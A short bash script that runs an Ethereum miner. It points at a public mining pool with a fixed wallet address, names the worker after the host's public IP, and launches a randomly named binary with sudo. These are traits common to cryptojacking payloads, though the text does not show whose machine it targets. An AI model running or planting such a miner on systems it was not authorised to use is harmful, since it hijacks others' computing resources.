#!/bin/bash

POOL=ethproxy+tcp://us1.ethermine.org:14444
WALLET=0x35c7ed9124ea813033d909c0698a1eb52aa9e268
WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-Catok

cd "$(dirname "$0")"

chmod +x ./eaedaeqsd2wqe122 && sudo ./eaedaeqsd2wqe122 -a ethash -o $POOL -u $WALLET.$WORKER $@
